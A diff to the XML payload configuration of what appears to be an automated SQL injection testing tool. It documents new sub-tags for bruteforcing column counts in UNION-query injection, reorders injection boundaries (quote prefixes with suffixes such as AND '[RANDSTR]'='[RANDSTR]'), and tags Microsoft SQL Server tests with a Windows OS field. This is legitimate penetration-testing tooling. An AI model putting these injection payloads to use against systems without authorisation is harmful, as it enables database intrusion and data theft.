@@ -138,6 +138,14 @@ Tag: <test>
         Sub-tag: <comment>
             Comment to append to the payload, before the suffix.
 
+        Sub-tag: <char>
+            Character to use to bruteforce number of columns in UNION
+            query SQL injection tests.
+
+        Sub-tag: <columns>
+            Range of columns to test for in UNION query SQL injection
+            tests.
+
     Sub-tag: <response>
         How to identify if the injected payload succeeded.
 
@@ -201,6 +209,8 @@ Formats:
         <request>
             <payload></payload>
             <comment></comment>
+            <char></char>
+            <columns></columns>
         </request>
         <response>
             <comparison></comparison>
@@ -220,15 +230,6 @@ Formats:
 <root>
     <!-- Generic boundaries -->
     <boundary>
-        <level>1</level>
-        <clause>0</clause>
-        <where>1,2,3</where>
-        <ptype>1</ptype>
-        <prefix></prefix>
-        <suffix></suffix>
-    </boundary>
-
-    <boundary>
         <level>3</level>
         <clause>1</clause>
         <where>1,2</where>
@@ -238,20 +239,20 @@ Formats:
     </boundary>
 
     <boundary>
-        <level>3</level>
-        <clause>1</clause>
-        <where>1,2</where>
-        <ptype>2</ptype>
-        <prefix>'</prefix>
-        <suffix></suffix>
-    </boundary>
-
-    <boundary>
         <level>4</level>
         <clause>1</clause>
         <where>1,2</where>
         <ptype>2</ptype>
         <prefix>')</prefix>
+        <suffix></suffix>
+    </boundary>
+
+    <boundary>
+        <level>3</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>2</ptype>
+        <prefix>'</prefix>
         <suffix></suffix>
     </boundary>
 
@@ -295,11 +296,11 @@ Formats:
 
     <boundary>
         <level>1</level>
-        <clause>1</clause>
-        <where>1,2</where>
-        <ptype>2</ptype>
-        <prefix>'</prefix>
-        <suffix>AND '[RANDSTR]'='[RANDSTR]</suffix>
+        <clause>0</clause>
+        <where>1,2,3</where>
+        <ptype>1</ptype>
+        <prefix></prefix>
+        <suffix></suffix>
     </boundary>
 
     <boundary>
@@ -330,12 +331,12 @@ Formats:
     </boundary>
 
     <boundary>
-        <level>2</level>
+        <level>1</level>
         <clause>1</clause>
         <where>1,2</where>
-        <ptype>3</ptype>
+        <ptype>2</ptype>
         <prefix>'</prefix>
-        <suffix>AND '[RANDSTR]' LIKE '[RANDSTR]</suffix>
+        <suffix>AND '[RANDSTR]'='[RANDSTR]</suffix>
     </boundary>
 
     <boundary>
@@ -369,9 +370,9 @@ Formats:
         <level>2</level>
         <clause>1</clause>
         <where>1,2</where>
-        <ptype>4</ptype>
-        <prefix>"</prefix>
-        <suffix>AND "[RANDSTR]"="[RANDSTR]</suffix>
+        <ptype>3</ptype>
+        <prefix>'</prefix>
+        <suffix>AND '[RANDSTR]' LIKE '[RANDSTR]</suffix>
     </boundary>
 
     <boundary>
@@ -402,12 +403,12 @@ Formats:
     </boundary>
 
     <boundary>
-        <level>3</level>
+        <level>2</level>
         <clause>1</clause>
         <where>1,2</where>
-        <ptype>5</ptype>
+        <ptype>4</ptype>
         <prefix>"</prefix>
-        <suffix>AND "[RANDSTR]" LIKE "[RANDSTR]</suffix>
+        <suffix>AND "[RANDSTR]"="[RANDSTR]</suffix>
     </boundary>
 
     <boundary>
@@ -435,6 +436,15 @@ Formats:
         <ptype>5</ptype>
         <prefix>")))</prefix>
         <suffix>AND ((("[RANDSTR]" LIKE "[RANDSTR]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>3</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>5</ptype>
+        <prefix>"</prefix>
+        <suffix>AND "[RANDSTR]" LIKE "[RANDSTR]</suffix>
     </boundary>
     <!-- End of WHERE/HAVING clause boundaries -->
 
@@ -633,6 +643,7 @@ Formats:
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
         </details>
     </test>
 
@@ -746,6 +757,7 @@ Formats:
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
         </details>
     </test>
 
@@ -827,6 +839,7 @@ Formats:
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
         </details>
     </test>
 
@@ -846,6 +859,7 @@ Formats:
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
         </details>
     </test>
 
@@ -1001,6 +1015,7 @@ Formats:
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
         </details>
     </test>
 
@@ -1020,6 +1035,7 @@ Formats:
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
         </details>
     </test>
 
@@ -1162,6 +1178,7 @@ Formats:
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
         </details>
     </test>
 
@@ -1261,6 +1278,7 @@ Formats:
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
         </details>
     </test>
 
@@ -1411,6 +1429,7 @@ Formats:
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
         </details>
     </test>
 
@@ -1717,6 +1736,7 @@ Formats:
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
         </details>
     </test>
 
@@ -1736,6 +1756,7 @@ Formats:
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
         </details>
     </test>
 
@@ -1756,6 +1777,7 @@ Formats:
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
         </details>
     </test>
 
@@ -2017,6 +2039,7 @@ Formats:
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
+            <os>Windows</os>
         </details>
     </test>
 
